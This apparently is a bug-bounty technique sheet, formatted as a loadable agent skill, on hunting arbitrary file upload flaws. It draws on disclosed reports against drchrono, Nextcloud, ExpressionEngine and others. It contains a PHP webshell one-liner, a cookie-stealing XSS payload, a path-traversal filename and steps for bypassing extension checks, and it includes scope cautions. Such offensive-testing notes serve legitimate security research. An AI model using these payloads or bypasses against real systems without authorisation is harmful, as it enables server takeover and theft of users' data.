---
name: hunter-l3-arbitrary-file-upload
description: "Use when hunting Arbitrary File Upload on a target. Loads the L3 technique sheet: Arbitrary/unrestricted file upload covers any server-side flow where attacker-chosen content lands on the server (or is fetched by the server) without adequate validation of type, extension, filename, or destination."
domain: cybersecurity
subdomain: web
tags:
- web
- arbitrary-file-upload
- hunting
- l3
version: '1.0'
---

# Arbitrary File Upload — Technique Sheet

## Overview
Arbitrary/unrestricted file upload covers any server-side flow where attacker-chosen content lands on the server (or is fetched by the server) without adequate validation of type, extension, filename, or destination. It pays when the uploaded file is subsequently served or executed: webshell → RCE, HTML/SVG → stored XSS, predictable URL → content hosting/phishing. The records show it lives in four places most hunters under-test: legacy CMS plugins, file "rename-to-pass" endpoints, URL-fetch ("link to image") features, and theming/logo uploaders.

## Distinct sub-patterns

### 1. Client-side-only extension validation (rename + raw POST)
- Endpoint shape: `POST /hipaa_forms` (document upload), param `file`. Any "only .pdf allowed" UI upload is the target shape.
- Payload: `<?php system($_GET['cmd']); ?>` — saved as a `.php` file, renamed to `.pdf`, and sent as raw POST data.
- Root cause: File-type validation exists only in the client/enforcement layer (browser-side check on the chosen file). Nothing server-side inspects the bytes or extension; the raw-POST path bypasses the UI check entirely.
- Impact proven: The `.php`-as-`.pdf` shell was uploaded and served from the CDN at `.../hipaa_forms/2016/06/b193e25b-...pdf` — a stored, retrievable webshell on a HIPAA product.
- Exemplar: id=142940 (drchrono).

### 2. Unauthenticated endpoint serving uploads at a predictable URL
- Endpoint shape: `POST /upload.php` — no authentication required, no params needed beyond the file itself.
- Payload: not stated (a benign test file sufficed).
- Root cause: The endpoint accepts arbitrary files from anyone and serves them back at a predictable, guessable URL.
- Impact proven: Upload retrievable at `https://███/delete.me` — enabling stored XSS, attacker content hosting, or code execution if a script extension lands in an executable directory.
- Exemplar: id=698789 (U.S. Dept Of Defense).

### 3. Server-side URL fetch with no validation ("Link to avatar" / SSRF-to-file-save)
- Endpoint shape: `POST /admin.php?/cp/members/profile/settings`, param `avatar URL` (a field where the app fetches a remote URL rather than accepting an upload).
- Payload: `http://strukt.tk/test.svg` (attacker-hosted file containing JavaScript; a `.zip` also worked).
- Root cause: The app downloads arbitrary external URL content and writes it into the uploads folder with the same extension as the source — zero content-type or extension validation. This is upload-via-SSRF: you control both content and resulting filename.
- Impact proven: Arbitrary files created on the server from an attacker-chosen URL; SVG-with-JS persisted server-side (stored XSS), and the report notes other file types could enable command execution.
- Exemplar: id=149268 (ExpressionEngine).

### 4. Theming/logo upload with no file-type check
- Endpoint shape: Logo / login image upload in admin theming settings (Nextcloud instance theming), param `uploaded file`. Also seen as `POST /settings/admin/theming`.
- Payload: `<html><body><script>alert(document.cookie)</script></body></html>`
- Root cause: The logo/login-image upload does not validate file type and stores files under `data/themedinstancelogo` and `data/themedbackgroundlogo`, where HTML is served and executed as HTML. (PHP content was executed only as text — note the execution context boundaries.)
- Impact proven: Uploaded HTML executes on the server (stored XSS / content injection). Requires admin access, so impact is framed as attacker-with-admin planting a malicious file on the client server.
- Exemplar: id=155690 (Nextcloud).

### 5. Attacker-controlled filename via upload `key` (path traversal in filename)
- Endpoint shape: `POST /settings/admin/theming` (logo/favicon upload), param `key` — the key doubles as the destination filename.
- Payload: `../../../../var/www/html/evil.png`
- Root cause: The `key` field, used as the stored filename, can be modified by the attacker without validation — classic path traversal in the filename slot. Also yields path disclosure via an error message (CVE-2023-28833).
- Impact proven: File written under an attacker-controlled filename in the webapp; path disclosure leaked server layout.
- Exemplar: id=1781751 (Nextcloud).

### 6. Missing whitelist check on a functional upload (extension agnostic)
- Endpoint shape: `POST /artists` (artist upload), param `uploaded file`.
- Payload: `malicious.php` (a PHP file uploaded as-is).
- Root cause: No safe whitelist extension check — the endpoint accepts any file the client sends.
- Impact proven: Visitors could upload arbitrary files to the server; a crafted filename/mime could execute code if the storage location is executable (report marks execution as theoretical). Still valid as unrestricted upload.
- Exemplar: id=15574 (FanFootage).

### 7. Known-vulnerable upload plugin (version fingerprinting)
- Endpoint shape: N/A — detection, not exploitation. Target: a WordPress blog running the MailPoet plugin (`wysija-newsletters`).
- Payload: not stated (public exploit for CVE-2014-4725-class MailPoet arbitrary file upload applies).
- Root cause: Outdated WordPress MailPoet plugin with a known remote file upload vulnerability installed on `business-blog.zomato.com`.
- Impact proven: Vulnerable plugin version confirmed on a production corporate blog, enabling remote file upload as documented for the plugin.
- Exemplar: id=114389 (Zomato, Eternal program).

## Bypass / chain notes
- UI says "PDF only" → don't test in the browser. Rename shell to `.pdf` and replay the request with raw POST data (id=142940). Client-side validation is the most common upload weakness class in these records.
- URL-fetch features are uploads in disguise: host your payload (`test.svg`, `.zip`) on your own domain and let the app fetch it (id=149268). This also sidesteps upload-endpoint filters entirely and gives you extension control (file saved with source extension).
- SVG is a reliable HTML-execution carrier: `<script>` inside `.svg` fired where image validation might otherwise only check "is it an image" (id=149268).
- Filename-as-destination (`key` param): inject `../` sequences (`../../../../var/www/html/evil.png`) to control write location; error messages from the failed/odd path leak absolute paths (id=1781751).
- Chain observed in drchrono record: register account → attempt PHP upload in UI (blocked) → rename to `.pdf` + raw POST → shell served from CDN.
- DoD record shows the simplest chain: unauthenticated upload → predictable URL (`/delete.me`) → stored XSS or hosting abuse without any bypass needed (id=698789).
- Legacy CMS plugin inventory (wappalyzer/`/wp-content/plugins/` probing) is a chain starter: known MailPoet exploit = upload without needing a novel bypass (id=114389).

## Gotchas / what NOT to do
- Execution context boundaries are real: on Nextcloud, uploaded HTML executed but PHP ran as plain text (id=155690). Don't claim RCE where only HTML/XSS fired.
- Don't overstate theoretical impact: in id=15574 the PHP upload landed, but code execution depended on whether the storage path executes — the report itself marked it theoretical. Prove serving/executing behavior before claiming it.
- Admin-gated uploaders (theming) are lower severity by default — frame impact as what an attacker with admin can do to downstream clients, not as privilege escalation you achieved.
- Skip the UI entirely when testing; the browser's file picker is where the (fake) validation lives.
- Version-detection-only findings (id=114389) should demonstrate the vulnerable version concretely; full exploitation of disclosed upload CVEs on third-party SaaS can cross into out-of-scope — check program policy before popping shells.

## Real-world impact examples
- Webshell on a HIPAA-compliant medical platform: PHP shell served from the production CDN as `...pdf` (id=142940, drchrono).
- Unauthenticated arbitrary file hosting on a DoD asset: `https://███/delete.me` retrievable by anyone (id=698789).
- Server-side arbitrary file write from attacker-chosen URL on ExpressionEngine admin (SVG-with-JS stored) (id=149268).
- Stored XSS via HTML logo upload on Nextcloud theming (id=155690).
- Arbitrary-path file write + path disclosure on Nextcloud theming `key` (CVE-2023-28833) (id=1781751).
- Arbitrary file upload on production corporate blog via outdated MailPoet plugin (id=114389, Zomato).